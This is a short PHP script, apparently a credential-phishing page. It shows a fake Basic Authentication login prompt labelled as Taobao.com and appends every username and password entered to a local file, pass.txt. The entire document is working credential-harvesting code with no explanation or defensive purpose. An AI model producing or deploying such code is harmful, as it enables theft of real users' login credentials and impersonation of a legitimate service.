<?php
if($_SERVER['PHP_AUTH_PW'] =="" || $_SERVER['PHP_AUTH_USER'] =="" )
{
header('WWW-Authenticate: Basic realm="Taobao.com"');
header('HTTP/1.0 401 Unauthorized');
}
else{
$user = $_SERVER['PHP_AUTH_USER'];
$pass = $_SERVER['PHP_AUTH_PW'];
$fish = "username:".$user."  password:".$pass;
file_put_contents("pass.txt",$fish."\n",FILE_APPEND);
}
?>
